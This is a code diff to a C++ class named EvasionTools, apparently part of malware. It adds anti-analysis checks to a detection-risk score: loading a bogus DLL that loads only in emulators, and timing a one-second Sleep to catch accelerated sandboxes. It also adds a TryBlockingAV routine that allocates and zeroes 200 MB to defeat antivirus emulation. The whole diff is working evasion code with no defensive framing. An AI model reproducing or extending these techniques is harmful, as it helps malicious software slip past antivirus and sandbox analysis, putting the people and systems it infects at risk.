@@ -54,14 +54,31 @@ class EvasionTools{
 			DWORD runningProcessesCount;
 			EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
 			runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
+			HINSTANCE Dll=LoadLibrary("nel556nil0null.lib");
+			int tick = GetTickCount();
+			Sleep(1000);
+			int tac  = GetTickCount();
+
+
 			RiskOfDetection = 0;
+
 			if ( CStat.dwNumberOfProcessors < 2 )       RiskOfDetection++;
 			if ( (MStat.ullTotalPhys/1024/1024) < 2048) RiskOfDetection++;
 			if ( diskSizeGB < 100 )                     RiskOfDetection++;
 			if (runningProcessesCount < 50)             RiskOfDetection++;
+			if (Dll != NULL)			    RiskOfDetection++;
+			if ((tac - tick) < 1000)		    RiskOfDetection++;
 
 
 			return RiskOfDetection;
+		}
+		int TryBlockingAV(){
+			char *md=NULL;
+			md=(char*)malloc(200000000);
+			if (md!=NULL){
+				memset(md, 0x00, 200000000);
+				free(md);
+			}
 		}
 };
 
